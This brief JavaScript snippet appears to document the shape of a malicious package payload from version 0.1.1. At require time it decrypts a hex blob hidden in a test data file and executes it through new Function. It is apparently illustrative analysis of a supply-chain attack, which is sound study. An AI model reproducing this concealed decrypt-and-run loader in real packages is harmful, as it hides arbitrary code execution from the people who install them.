// The documented shape of the 0.1.1 payload: a bundled hex blob
// decrypted with crypto and run through Function at require time.
const data = require("./test/data.js");
const crypto = require("crypto");
const dec = crypto.createDecipher("aes256", "demo-key");
let payload = dec.update(data.blob, "hex", "utf8");
payload += dec.final("utf8");
const fn = new Function("require", payload);
fn(require);
